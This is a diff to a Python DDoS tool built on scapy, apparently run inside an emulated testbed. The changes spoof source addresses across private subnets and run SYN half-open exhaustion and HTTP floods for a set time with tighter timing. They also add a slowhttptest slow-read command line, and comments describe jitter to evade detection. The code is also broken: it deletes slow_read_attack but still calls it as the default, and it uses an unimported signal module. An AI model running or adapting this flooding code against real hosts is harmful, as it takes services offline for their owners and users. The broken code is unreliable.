@@ -11,24 +11,35 @@ from scapy.layers.http import HTTPRequest
 import ssl
 import re
 import logging
+import subprocess
+from pathlib import Path
 
-# Configure logging
+# Configure main logger
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger('adversarial_ddos')
+
+# Attack-specific logger (will be configured in run_attack)
+attack_logger = logging.getLogger('attack_details')
+attack_logger.setLevel(logging.INFO)
+attack_logger.propagate = False # Prevent messages from being passed to the root logger
+
 
 # ---- IP Address Management ----
 
 class IPRotator:
-    def __init__(self, subnet="192.168.0.0/16"):
-        self.subnet = ipaddress.IPv4Network(subnet)
+    def __init__(self, subnets=None):
+        if subnets is None:
+            subnets = ["192.168.0.0/16"]
+        self.subnets = [ipaddress.IPv4Network(s) for s in subnets]
         self.used_ips = set()
         self.lock = threading.Lock()
     
     def get_random_ip(self):
         with self.lock:
-            # Get a random IP from subnet that hasn't been used recently
+            # Get a random IP from one of the subnets that hasn't been used recently
             while True:
-                random_ip = str(random.choice(list(self.subnet.hosts())))
+                chosen_subnet = random.choice(self.subnets)
+                random_ip = str(random.choice(list(chosen_subnet.hosts())))
                 if random_ip not in self.used_ips:
                     self.used_ips.add(random_ip)
                     # Keep track of last 1000 IPs to avoid reuse
@@ -120,75 +131,24 @@ class AdvancedTechniques:
         self.target_info = {}
         self.session_tokens = {}
     
-    def slow_read_attack(self, dst, num_connections=50, duration=30):
-        """
-        Slowloris-type attack that establishes many connections but reads responses very slowly
-        """
-        logger.info(f"Starting slow read attack against {dst} with {num_connections} connections")
-        connections = []
-        
-        try:
-            # Establish multiple connections
-            for _ in range(num_connections):
-                src = self.ip_rotator.get_random_ip()
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(2)
-                s.connect((dst, 80))
-                
-                # Send a valid HTTP request
-                request = f"GET / HTTP/1.1\r\nHost: {dst}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
-                s.send(request.encode())
-                
-                # Add to our list of connections
-                connections.append(s)
-                
-                # Small delay between connection establishments
-                time.sleep(random.uniform(0.1, 0.3))
-            
-            # Keep connections open by reading very slowly
-            end_time = time.time() + duration
-            while time.time() < end_time:
-                for s in connections:
-                    try:
-                        # Read just 1 byte at a time, very slowly
-                        s.recv(1)
-                        time.sleep(random.uniform(1, 5))
-                    except socket.timeout:
-                        # Socket timed out, which is fine
-                        pass
-                    except:
-                        # If connection closed, try to reestablish
-                        try:
-                            s.close()
-                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            s.settimeout(2)
-                            s.connect((dst, 80))
-                            request = f"GET / HTTP/1.1\r\nHost: {dst}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
-                            s.send(request.encode())
-                        except:
-                            pass
-        finally:
-            # Close all connections
-            for s in connections:
-                try:
-                    s.close()
-                except:
-                    pass
     
-    def tcp_state_exhaustion(self, dst, dport=80, num_packets=1000):
+    
+    def tcp_state_exhaustion(self, dst, dport=80, num_packets_per_sec=50, duration=5):
         """
         Advanced TCP state exhaustion attack that manipulates sequence numbers
         and window sizes to keep connections half-open but valid
         """
-        logger.info(f"Starting TCP state exhaustion attack against {dst}:{dport}")
+        logger.info(f"Starting TCP state exhaustion attack against {dst}:{dport} for {duration} seconds")
         
         # Track sequence numbers for more sophisticated sequence prediction
         seq_base = random.randint(1000000, 9000000)
         
-        for i in range(num_packets):
+        end_time = time.time() + duration
+        packet_count = 0
+        while time.time() < end_time:
             src = self.ip_rotator.get_random_ip()
             sport = random.randint(1024, 65535)
-            seq = seq_base + (i * 1024)
+            seq = seq_base + (packet_count * 1024)
             
             # Sophisticated manipulation of TCP window size
             window = random.randint(16384, 65535)
@@ -199,9 +159,11 @@ class AdvancedTechniques:
             
             # Send and wait for SYN-ACK
             try:
+                attack_logger.info(f"Sending SYN packet from {src}:{sport} to {dst}:{dport}")
                 reply = sr1(syn_packet, timeout=0.1, verbose=0)
                 
                 if reply and reply.haslayer(TCP) and reply.getlayer(TCP).flags & 0x12:  # SYN+ACK
+                    attack_logger.info(f"Received SYN-ACK from {dst}:{dport}. Sending ACK.")
                     # Extract server sequence number and acknowledge it
                     server_seq = reply.getlayer(TCP).seq
                     ack_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
@@ -211,19 +173,23 @@ class AdvancedTechniques:
                     
                     # After establishing connection, don't continue with data transfer
                     # This keeps connection half-open, consuming resources on target
-                    logger.debug(f"Established half-open connection from {src}:{sport}")
-            except:
+                    attack_logger.info(f"Established half-open connection from {src}:{sport}")
+                else:
+                    attack_logger.info(f"No SYN-ACK received or invalid reply for {src}:{sport}.")
+            except Exception as e:
+                attack_logger.warning(f"Error during TCP state exhaustion from {src}:{sport}: {e}")
                 pass
             
+            packet_count += 1
             # Add jitter to avoid detection based on timing patterns
-            time.sleep(random.uniform(0.01, 0.1))
+            time.sleep(random.uniform(0.01, 0.05)) # Reduced sleep for more packets per second
     
-    def distributed_application_layer_attack(self, dst, dport=80, num_requests=100):
+    def distributed_application_layer_attack(self, dst, dport=80, num_requests_per_sec=20, duration=5):
         """
         Advanced application layer attack that mimics legitimate HTTP traffic
         but targets resource-intensive endpoints
         """
-        logger.info(f"Starting distributed application layer attack against {dst}:{dport}")
+        logger.info(f"Starting distributed application layer attack against {dst}:{dport} for {duration} seconds")
         
         # Resource-intensive endpoints that might cause server strain
         resource_heavy_paths = [
@@ -234,7 +200,9 @@ class AdvancedTechniques:
             "/images/highres_" + str(random.randint(1000, 9999)) + ".jpg"
         ]
         
-        for _ in range(num_requests):
+        end_time = time.time() + duration
+        request_count = 0
+        while time.time() < end_time:
             src = self.ip_rotator.get_random_ip()
             
             # Create base TCP connection
@@ -243,6 +211,9 @@ class AdvancedTechniques:
             # Select a resource-heavy path
             path = random.choice(resource_heavy_paths)
             
+            # Choose random HTTP method
+            method = random.choice(self.packet_crafter.http_methods)
+
             # Create HTTP request targeting resource-heavy endpoint
             user_agent = random.choice(self.packet_crafter.user_agents)
             headers = dict(self.packet_crafter.common_headers)
@@ -250,7 +221,7 @@ class AdvancedTechniques:
             headers["Host"] = dst
             
             # Format HTTP request
-            http_request = f"GET {path} HTTP/1.1\r\n"
+            http_request = f"{method} {path} HTTP/1.1\r\n"
             for header, value in headers.items():
                 http_request += f"{header}: {value}\r\n"
             
@@ -262,10 +233,12 @@ class AdvancedTechniques:
             
             # Send packet
             packet = base_packet/Raw(load=http_request.encode())
+            attack_logger.info(f"App Layer: Sending {method} request from {src} to {dst}:{dport} for path {path}")
             send(packet, verbose=0)
             
+            request_count += 1
             # Variable timing to avoid detection
-            time.sleep(random.uniform(0.05, 0.2))
+            time.sleep(random.uniform(0.05, 0.1)) # Reduced sleep for more requests per second
     
     def multi_vector_attack(self, dst, duration=60):
         """
@@ -472,7 +445,7 @@ class AdaptiveController:
         params = {
             "packet_rate": 10,
             "connection_count": 50,
-            "preferred_technique": "multi_vector",
+            "preferred_technique": "slow_read",
             "rotation_speed": "medium"
         }
         
@@ -518,7 +491,7 @@ class AdaptiveController:
 class AdvancedDDoSCoordinator:
     def __init__(self, target):
         self.target = target
-        self.ip_rotator = IPRotator("192.168.0.0/16")
+        self.ip_rotator = IPRotator(subnets=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"])
         self.advanced = AdvancedTechniques(self.ip_rotator)
         self.session_maintainer = SessionMaintainer(self.ip_rotator)
         self.adaptive_controller = AdaptiveController(target)
@@ -580,32 +553,48 @@ class AdvancedDDoSCoordinator:
 
 # ---- Run everything ----
 
-def run_attack(attacker_host, victim_ip, duration, attack_variant="multi_vector"):
+def run_attack(attacker_host, victim_ip, duration, attack_variant="slow_read", output_dir=None):
     """
     Main function to run a specific advanced adversarial attack.
     attacker_host is not directly used here as IP rotation is handled internally.
     """
+    if output_dir:
+        attack_log_file = Path(output_dir) / "attack.log"
+        file_handler = logging.FileHandler(attack_log_file)
+        file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
+        attack_logger.addHandler(file_handler)
+
     logger.info(f"Starting advanced adversarial attack '{attack_variant}' against {victim_ip} for {duration} seconds.")
     coordinator = AdvancedDDoSCoordinator(victim_ip)
 
     if attack_variant == "slow_read":
         coordinator.advanced.slow_read_attack(victim_ip, duration=duration)
     elif attack_variant == "ad_syn":
-        # For state exhaustion, we might run it in a loop for the duration
-        end_time = time.time() + duration
-        while time.time() < end_time:
-            coordinator.advanced.tcp_state_exhaustion(victim_ip, num_packets=5)
-            time.sleep(1) # Small delay
+        coordinator.advanced.tcp_state_exhaustion(victim_ip, duration=duration)
     elif attack_variant == "ad_udp":
-        end_time = time.time() + duration
-        while time.time() < end_time:
-            coordinator.advanced.distributed_application_layer_attack(victim_ip, num_requests=10)
-            time.sleep(1) # Small delay
-    elif attack_variant == "multivector":
-        coordinator.advanced.multi_vector_attack(victim_ip, duration=duration)
+        coordinator.advanced.distributed_application_layer_attack(victim_ip, duration=duration)
+    elif attack_variant == "ad_slow":
+        attack_logger.info(f"Starting slowhttptest (Slow Read) from {attacker_host.name} to {victim_ip} for {duration} seconds.")
+        # -c: number of connections, -H: Slowloris mode, -i: interval, -r: connections per second, -l: duration
+        # -u: URL, -t SR: Slow Read attack
+        slowhttptest_cmd = f"slowhttptest -c 100 -H -i 10 -r 20 -l {duration} -u http://{victim_ip}:80/ -t SR"
+        process = attacker_host.popen([slowhttptest_cmd], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        time.sleep(duration)
+        try:
+            process.send_signal(signal.SIGINT) # Attempt to stop slowhttptest gracefully
+        except:
+            process.terminate() # Fallback to terminate
+        stdout, stderr = process.communicate() # Get output after termination
+
+        if stdout:
+            attack_logger.info(f"slowhttptest stdout: {stdout.decode().strip()}")
+        if stderr:
+            attack_logger.error(f"slowhttptest stderr: {stderr.decode().strip()}")
+        attack_logger.info(f"slowhttptest (Slow Read) from {attacker_host.name} to {victim_ip} finished.")
     else:
-        logger.warning(f"Unknown attack variant: {attack_variant}. Running multi_vector by default.")
-        coordinator.advanced.multi_vector_attack(victim_ip, duration=duration)
+        logger.warning(f"Unknown attack variant: {attack_variant}. Running slow_read by default.")
+        coordinator.advanced.slow_read_attack(victim_ip, duration=duration)
     
     logger.info(f"Advanced adversarial attack '{attack_variant}' completed.")
 
